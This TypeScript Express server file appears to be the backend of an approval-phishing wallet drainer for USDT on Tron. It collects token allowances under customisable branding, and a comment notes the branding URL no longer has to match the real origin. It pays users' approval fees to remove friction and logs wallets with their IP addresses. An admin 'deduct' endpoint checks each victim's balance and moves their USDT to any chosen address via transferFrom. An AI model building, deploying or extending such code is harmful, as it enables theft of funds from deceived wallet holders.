import express, { type NextFunction, type Request, type Response } from 'express'
import { requireAdmin } from './auth.js'
import { config, TRON_CHAIN_ID } from './config.js'
import { energyRentalEnabled, ensureEnergy } from './energy.js'
import * as store from './store.js'
import {
  assertDeductionSigner,
  checkUsdtTransaction,
  formatUsdt,
  getAccountDetails,
  hasDeductionKey,
  isTronAddress,
  parseUsdtAmount,
  readAllowance,
  transferFrom,
} from './tron.js'

const TX_ID_RE = /^[0-9a-f]{64}$/i
const ACTIONS = new Set(['approve', 'revoke', 'reset'])
const DEFAULT_BRANDING = { name: 'Tron Connect', description: 'USDT approval on Tron' }
const ICON_MIMES = new Set(['image/png', 'image/jpeg', 'image/webp', 'image/svg+xml'])
const MAX_ICON_BYTES = 1_000_000

/** Builds the Express app without listening, so it can run locally or on Vercel. */
export function createApp() {
  const app = express()
  const startedAt = new Date().toISOString()

  app.disable('x-powered-by')
  app.set('trust proxy', true)
  app.use(express.json({ limit: '2mb' }))

  app.use('/api', (_req, res, next) => {
    res.setHeader('cache-control', 'no-store')
    next()
  })

  app.get('/api/health', (_req, res) => {
    res.json({
      ok: true,
      startedAt,
      uptimeSeconds: Math.round(process.uptime()),
      storage: store.storageMode(),
    })
  })

  app.get('/api/config', (_req, res) => {
    res.json({
      spender: config.spender,
      usdt: config.usdt,
      required: config.requiredAllowance.toString(),
      network: TRON_CHAIN_ID,
      configured: isTronAddress(config.spender),
    })
  })

  /**
   * Branding used by the client for the WalletConnect metadata. Editable from
   * the admin panel; falls back to the bundled defaults.
   */
  app.get('/api/branding', async (_req, res) => {
    const branding = await store.getBranding()
    res.json({
      name: branding?.name ?? DEFAULT_BRANDING.name,
      description: branding?.description ?? DEFAULT_BRANDING.description,
      url: branding?.url ?? null,
      iconUrl: iconPath(branding),
      updatedAt: branding?.updatedAt ?? null,
    })
  })

  app.get('/api/branding/icon', async (_req, res) => {
    const branding = await store.getBranding()
    if (!branding?.icon) {
      res.redirect(302, '/icon.svg')
      return
    }

    res.setHeader('content-type', branding.icon.mime)
    res.setHeader('cache-control', 'public, max-age=60')
    res.setHeader('x-content-type-options', 'nosniff')
    res.setHeader('content-security-policy', "default-src 'none'; style-src 'unsafe-inline'; img-src data:")
    res.send(Buffer.from(branding.icon.data, 'base64'))
  })

  /**
   * Confirms allowance(owner, spender) against TronGrid.
   * Every call is recorded for the admin panel.
   */
  app.get('/api/verify', async (req: Request, res: Response) => {
    const owner = String(req.query.owner ?? '').trim()

    if (!isTronAddress(owner)) {
      res.status(400).json({ error: 'owner must be a base58 Tron address.' })
      return
    }
    if (!isTronAddress(config.spender)) {
      res.status(500).json({ error: 'Server SPENDER is not configured.' })
      return
    }

    try {
      const allowance = await readAllowance(owner)
      const sufficient = allowance >= config.requiredAllowance

      const record = await store.addVerification({
        owner,
        spender: config.spender,
        allowance: allowance.toString(),
        sufficient,
        ip: clientIp(req),
      })

      res.json({
        owner,
        spender: config.spender,
        usdt: config.usdt,
        allowance: allowance.toString(),
        required: config.requiredAllowance.toString(),
        sufficient,
        checkedAt: record.at,
      })
    } catch (err) {
      res.status(502).json({ error: errorMessage(err) })
    }
  })

  /**
   * Rents energy onto the owner so their approval costs no TRX.
   * Skipped when they can pay the fee themselves. Public; cooldown + cap.
   */
  app.post('/api/energy', async (req: Request, res: Response) => {
    const owner = String((req.body ?? {}).owner ?? '').trim()

    if (!isTronAddress(owner)) {
      res.status(400).json({ error: 'owner must be a base58 Tron address.' })
      return
    }
    if (!energyRentalEnabled()) {
      res.json({ rented: false, reason: 'disabled' })
      return
    }

    res.json(await ensureEnergy(owner))
  })

  /**
   * Records a client-reported approval/revoke, but only after re-checking the
   * transaction and the resulting allowance on TronGrid.
   */
  app.post('/api/events', async (req: Request, res: Response) => {
    const body = (req.body ?? {}) as Record<string, unknown>
    const owner = String(body.owner ?? '').trim()
    const txId = String(body.txId ?? '').trim()
    const action = String(body.action ?? '').trim() as 'approve' | 'revoke' | 'reset'
    const amount = String(body.amount ?? '').trim()

    if (!isTronAddress(owner)) {
      res.status(400).json({ error: 'owner must be a base58 Tron address.' })
      return
    }
    if (!TX_ID_RE.test(txId)) {
      res.status(400).json({ error: 'txId must be a 64-character hex transaction id.' })
      return
    }
    if (!ACTIONS.has(action)) {
      res.status(400).json({ error: 'action must be approve, revoke or reset.' })
      return
    }

    try {
      await checkUsdtTransaction(txId, owner)
      const allowanceAfter = await readAllowance(owner)

      const event = await store.addEvent({
        owner,
        txId,
        action,
        amount,
        status: 'confirmed',
        allowanceAfter: allowanceAfter.toString(),
        ip: clientIp(req),
      })

      res.status(201).json(event)
    } catch (err) {
      const event = await store.addEvent({
        owner,
        txId,
        action,
        amount,
        status: 'failed',
        allowanceAfter: null,
        error: errorMessage(err),
        ip: clientIp(req),
      })

      res.status(422).json({ error: errorMessage(err), event })
    }
  })

  app.get('/api/admin/summary', requireAdmin, async (req: Request, res: Response) => {
    const base = await store.summary()
    const force = req.query.refresh === '1'

    const wallets = await Promise.all(
      base.wallets.map(async (wallet) => ({
        ...wallet,
        activity: await store.walletActivity(wallet.owner),
        onchain: await getAccountDetails(wallet.owner, { force }),
      })),
    )

    res.json({
      ...base,
      wallets,
      config: {
        spender: config.spender,
        usdt: config.usdt,
        required: config.requiredAllowance.toString(),
        network: TRON_CHAIN_ID,
        configured: isTronAddress(config.spender),
        canDeduct: hasDeductionKey(),
        storage: store.storageMode(),
      },
      serverStartedAt: startedAt,
    })
  })

  app.get('/api/admin/export', requireAdmin, async (_req, res) => {
    res.setHeader('content-disposition', 'attachment; filename="tron-connect-store.json"')
    res.json(await store.exportAll())
  })

  app.get('/api/admin/branding', requireAdmin, async (req: Request, res: Response) => {
    const branding = await store.getBranding()
    const currentOrigin = requestOrigin(req)

    res.json({
      name: branding?.name ?? DEFAULT_BRANDING.name,
      description: branding?.description ?? DEFAULT_BRANDING.description,
      url: branding?.url ?? null,
      iconUrl: iconPath(branding),
      updatedAt: branding?.updatedAt ?? null,
      hasIcon: Boolean(branding?.icon),
      currentOrigin,
      allowedOrigins: allowedOriginsFor(currentOrigin),
    })
  })

  app.put('/api/admin/branding', requireAdmin, async (req: Request, res: Response) => {
    const body = (req.body ?? {}) as Record<string, unknown>
    const name = String(body.name ?? '').trim()
    const description = String(body.description ?? '').trim()
    const rawUrl = String(body.url ?? '').trim()
    const iconDataUrl = typeof body.iconDataUrl === 'string' ? body.iconDataUrl : ''
    const removeIcon = body.removeIcon === true

    if (!name || name.length > 40 || /[\u0000-\u001f\u007f]/.test(name)) {
      res.status(400).json({ error: 'name must be 1-40 characters without control characters.' })
      return
    }
    if (description.length > 120) {
      res.status(400).json({ error: 'description must be at most 120 characters.' })
      return
    }

    // Format is still enforced (bare http/https origin); the value no longer
    // has to be the current origin or an ALLOWED_ORIGINS entry.
    let url: string | null = null
    if (rawUrl) {
      url = normalizeOrigin(rawUrl)
      if (!url) {
        res.status(400).json({ error: 'url must be a bare http(s) origin, e.g. https://app.example.com.' })
        return
      }
    }

    let icon = (await store.getBranding())?.icon ?? null
    if (removeIcon) icon = null

    if (iconDataUrl) {
      const parsed = parseIconDataUrl(iconDataUrl)
      if (!parsed) {
        res.status(400).json({
          error: 'icon must be a PNG, JPEG, WebP or SVG data URL up to 1 MB.',
        })
        return
      }
      icon = parsed
    }

    const saved = await store.saveBranding({ name, description, url, icon })
    const currentOrigin = requestOrigin(req)

    res.json({
      name: saved.name,
      description: saved.description,
      url: saved.url,
      iconUrl: iconPath(saved),
      updatedAt: saved.updatedAt,
      hasIcon: Boolean(saved.icon),
      currentOrigin,
      allowedOrigins: allowedOriginsFor(currentOrigin),
    })
  })

  /**
   * Manually pulls USDT from an owner using the spender's allowance:
   * USDT.transferFrom(owner, to, amount), signed server-side.
   */
  app.post('/api/admin/deduct', requireAdmin, async (req: Request, res: Response) => {
    const body = (req.body ?? {}) as Record<string, unknown>
    const owner = String(body.owner ?? '').trim()
    const to = String(body.to ?? '').trim() || config.spender
    const amountInput = String(body.amount ?? '').trim()

    if (!isTronAddress(owner)) {
      res.status(400).json({ error: 'owner must be a base58 Tron address.' })
      return
    }
    if (!isTronAddress(to)) {
      res.status(400).json({ error: 'to must be a base58 Tron address.' })
      return
    }
    if (!isTronAddress(config.spender)) {
      res.status(500).json({ error: 'Server SPENDER is not configured.' })
      return
    }
    if (!hasDeductionKey()) {
      res.status(503).json({
        error: 'Deductions are disabled. Set SPENDER_PRIVATE_KEY on the server and restart.',
      })
      return
    }
    try {
      assertDeductionSigner()
    } catch (err) {
      res.status(503).json({ error: errorMessage(err) })
      return
    }

    let amount: bigint
    try {
      amount = parseUsdtAmount(amountInput)
    } catch (err) {
      res.status(400).json({ error: errorMessage(err) })
      return
    }

    try {
      const allowance = await readAllowance(owner)
      if (allowance < amount) {
        res.status(400).json({
          error: `Allowance is only ${formatUsdt(allowance)} USDT (requested ${formatUsdt(amount)}).`,
        })
        return
      }

      const account = await getAccountDetails(owner, { force: true })
      const balance = account.usdtBalance === null ? 0n : BigInt(account.usdtBalance)
      if (balance < amount) {
        res.status(400).json({ error: `Wallet holds only ${formatUsdt(balance)} USDT.` })
        return
      }

      const txId = await transferFrom(owner, to, amount)
      const allowanceAfter = await readAllowance(owner)

      const event = await store.addEvent({
        owner,
        txId,
        action: 'deduct',
        amount: amount.toString(),
        status: 'confirmed',
        allowanceAfter: allowanceAfter.toString(),
        ip: clientIp(req),
      })

      res.status(201).json({
        txId,
        owner,
        to,
        amount: amount.toString(),
        allowanceAfter: allowanceAfter.toString(),
        event,
      })
    } catch (err) {
      res.status(422).json({ error: errorMessage(err) })
    }
  })

  app.use('/api', (_req, res) => {
    res.status(404).json({ error: 'Not found.' })
  })

  app.use((err: unknown, _req: Request, res: Response, _next: NextFunction) => {
    console.error(err)
    res.status(500).json({ error: 'Internal server error.' })
  })

  return app
}

/** Human-readable startup checks for the local server log. */
export function startupMessages(): Array<{ level: 'log' | 'warn'; message: string }> {
  const messages: Array<{ level: 'log' | 'warn'; message: string }> = [
    { level: 'log', message: `Store: ${store.storageMode()}.` },
  ]

  if (!config.adminToken) {
    messages.push({ level: 'warn', message: 'ADMIN_TOKEN is empty: /api/admin/* will reject every request.' })
  }
  if (!isTronAddress(config.spender)) {
    messages.push({
      level: 'warn',
      message: 'SPENDER is not a valid Tron address: /api/verify will fail until it is set.',
    })
  } else if (!hasDeductionKey()) {
    messages.push({
      level: 'warn',
      message: 'Deductions disabled: SPENDER_PRIVATE_KEY is empty (admin "Deduct" widget is off).',
    })
  } else {
    try {
      assertDeductionSigner()
      messages.push({ level: 'log', message: `Deductions enabled for spender ${config.spender}.` })
    } catch (err) {
      messages.push({ level: 'warn', message: `Deductions disabled: ${errorMessage(err)}` })
    }
  }

  if (!energyRentalEnabled()) {
    messages.push({
      level: 'warn',
      message: 'Energy rental disabled: TRONSAVE_API_KEY is empty (users pay their own fees).',
    })
  }

  return messages
}

function clientIp(req: Request): string {
  return req.ip ?? req.socket.remoteAddress ?? 'unknown'
}

function iconPath(branding: store.BrandingRecord | null): string {
  return branding?.icon
    ? `/api/branding/icon?v=${encodeURIComponent(branding.updatedAt)}`
    : '/icon.svg'
}

/** Origin the admin request came from, used to validate branding.url. */
function requestOrigin(req: Request): string {
  const origin = normalizeOrigin(req.header('origin') ?? '')
  if (origin) return origin

  const referer = req.header('referer')
  if (referer) {
    try {
      return new URL(referer).origin
    } catch {
      // ignore malformed referer
    }
  }

  const proto = (req.header('x-forwarded-proto') ?? 'https').split(',')[0].trim()
  const host = req.header('x-forwarded-host') ?? req.header('host') ?? ''
  const composed = host ? normalizeOrigin(`${proto}://${host}`) : null
  return composed ?? ''
}

function normalizeOrigin(value: string): string | null {
  if (!value.trim()) return null

  try {
    const parsed = new URL(value.trim())
    if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') return null
    if (parsed.pathname !== '/' || parsed.search || parsed.hash) return null
    if (parsed.username || parsed.password) return null
    return parsed.origin
  } catch {
    return null
  }
}

function allowedOriginsFor(currentOrigin: string): string[] {
  return [...new Set([currentOrigin, ...config.allowedOrigins].filter(Boolean))]
}

function parseIconDataUrl(value: string): { mime: string; data: string } | null {
  const match = /^data:(image\/(?:png|jpeg|webp|svg\+xml));base64,([A-Za-z0-9+/=]+)$/.exec(
    value,
  )
  if (!match) return null

  const [, mime, data] = match
  if (!ICON_MIMES.has(mime) || !data) return null

  const padding = data.endsWith('==') ? 2 : data.endsWith('=') ? 1 : 0
  const bytes = Math.floor((data.length * 3) / 4) - padding
  if (bytes <= 0 || bytes > MAX_ICON_BYTES) return null

  return { mime, data }
}

function errorMessage(err: unknown): string {
  return err instanceof Error ? err.message : 'Unknown error.'
}
